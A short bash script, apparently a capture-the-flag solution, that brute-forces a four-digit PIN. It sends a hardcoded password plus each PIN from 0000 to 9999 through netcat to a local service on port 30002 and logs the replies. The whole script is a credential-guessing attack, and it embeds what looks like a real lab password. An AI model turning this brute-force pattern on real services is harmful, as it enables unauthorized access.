#!/bin/bash
pwd="UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"
for i in {0..9}{0..9}{0..9}{0..9}
do
	echo $pwd' '$i | nc 127.0.0.1 30002 >> bruteforce.txt &
done
